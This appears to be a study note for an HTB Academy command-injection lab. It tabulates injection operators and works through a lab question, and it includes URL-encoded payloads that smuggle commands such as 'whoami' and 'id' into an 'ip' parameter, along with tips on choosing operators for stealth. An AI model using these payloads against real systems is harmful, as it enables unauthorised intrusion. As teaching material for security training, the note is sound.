 emojis in headers:

# 🛰️ Cross-Injection Operator Reference

## Comprehensive Injection Operators Table

| **Injection Type** | **Primary Operators** | **Common Usage** | **Environment** |
|---------------------|----------------------|------------------|-----------------|
| **SQL Injection**   | `'` `;` `--` `/* */` | String termination, Comment injection | Database queries |
| **Command Injection** | `;` `&&` `\|\|` `\|` `&` `\n` | Command chaining, Logic operators | Shell environments |
| **LDAP Injection**  | `*` `(` `)` `&` `\|` | Wildcard, Logic grouping | Directory services |
| **XPath Injection** | `'` `or` `and` `not` `substring` `concat` `count` | Logic operators, Functions | XML document queries |
| **OS Command Injection** | `;` `&` `\|` `&&` `\|\|` `$()` `` ` `` | System command execution | Operating system |
| **Code Injection**  | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^` | Variable interpolation | Programming languages |
| **Directory Traversal** | `../` `..\` `%00` | Path navigation | File system access |
| **Object Injection** | `;` `&` `\|` | Object manipulation | Object-oriented environments |
| **XQuery Injection** | `'` `;` `--` `/* */` | Query manipulation | XML databases |
| **Shellcode Injection** | `\x` `\u` `%u` `%n` | Binary encoding | Low-level exploitation |
| **Header Injection** | `\n` `\r\n` `\t` `%0d` `%0a` `%09` | HTTP header manipulation | Web protocols |

## Operator Categories

### Logical Operators
```bash
&&  # AND - Execute if previous succeeds
||  # OR - Execute if previous fails  
!   # NOT - Logical negation
```

### Command Separators
```bash
;   # Sequential execution
&   # Background execution
|   # Pipe output
\n  # New line separator
```

### Substitution Operators
```bash
$()    # Command substitution (modern)
``     # Command substitution (legacy)
${}    # Variable expansion
``

### Encoding Characters
```bash
%0a    # New line (\n)
%0d    # Carriage return (\r)
%09    # Tab (\t)
%20    # Space
%00    # Null byte
```

## Environment-Specific Considerations

### Windows CMD
```cmd
# Limited operator support
command1 && command2  # Works
command1 || command2  # Works
command1 ; command2   # May not work
```

### PowerShell
```powershell
# Full operator support
command1; command2    # Works
command1 && command2  # Works (newer versions)
command1 || command2  # Works (newer versions)
```

### Unix/Linux Shell
```bash
# Complete operator support
command1; command2    # Sequential
command1 && command2  # Conditional (success)
command1 || command2  # Conditional (failure)
command1 | command2   # Pipe
command1 & command2   # Background
```

---

## Practical Lab Exercise

### HTB Academy Challenge

**Task:** Test the remaining three injection operators and determine output behavior.

**Operators to Test:**
1. **New Line** (`\n` → `%0a`)
2. **Background** (`&` → `%26`)
3. **Pipe** (`|` → `%7c`)

### Testing Methodology

**Step 1: New Line Testing**
```http
# Test payload
ip=127.0.0.1%0awhoami

# Expected result
# Both commands execute on separate lines
```

**Step 2: Background Testing**
```http
# Test payload  
ip=127.0.0.1%26whoami

# Expected result
# Both commands execute, second output may appear first
```

**Step 3: Pipe Testing**
```http
# Test payload
ip=127.0.0.1%7cwhoami

# Expected result
# Only second command output visible
```

### Output Analysis

**Compare Results:**
- **Semicolon (`;`)**: Both outputs, sequential order
- **AND (`&&`)**: Both outputs, conditional on success
- **OR (`||`)**: Second output only (if first fails)
- **New Line (`\n`)**: Both outputs, separate lines
- **Background (`&`)**: Both commands execute, potentially reversed order
- **Pipe (`|`)**: Only second command output ⭐

**Answer:** **Pipe (`|`)** operator only shows the output of the injected command.

---

## Operator Selection Strategy

### Choosing the Right Operator

**For Maximum Compatibility:**
```bash
# Use new line - works everywhere
payload%0acommand
```

**For Clean Output:**
```bash
# Use pipe - only injected command output
payload%7ccommand
```

**For Reliability:**
```bash
# Use AND - ensures first command succeeds
payload%26%26command
```

**For Error Exploitation:**
```bash
# Use OR - leverages failures
%7c%7ccommand
```

**For Stealth:**
```bash
# Use background - may confuse timing analysis
payload%26command
```

### Testing Priorities

**1. Start with Universal Operators:**
- `;` (semicolon) - Most compatible
- `\n` (newline) - Platform independent

**2. Test Conditional Operators:**
- `&&` (AND) - Success-dependent
- `||` (OR) - Failure-dependent

**3. Evaluate Specialized Operators:**
- `|` (pipe) - Clean output
- `&` (background) - Parallel execution

**4. Document Working Operators:**
```bash
# Maintain operator compatibility matrix
Environment: Linux + Apache + PHP
✓ ; (semicolon)     - Works, both outputs
✓ && (AND)          - Works, conditional  
✓ || (OR)           - Works, error-based
✓ | (pipe)          - Works, clean output
✓ & (background)    - Works, mixed order
✓ \n (newline)      - Works, separate lines
```

---

## Advanced Operator Combinations

### Multi-Operator Chains

**Complex Payloads:**
```bash
# Conditional chaining
127.0.0.1 && whoami || echo "failed"

# Background with pipe
127.0.0.1 & whoami | grep data

# Multiple separators
127.0.0.1; whoami && id
```

**Error Handling:**
```bash
# Graceful degradation
valid_command && injected_command || fallback_command
```

**Output Filtering:**
```bash
# Clean result extraction
original_command | injected_command 2>/dev/null
```

This comprehensive understanding of injection operators enables precise payload crafting for different scenarios and environmental constraints, maximizing exploitation success while adapting to various defensive measures.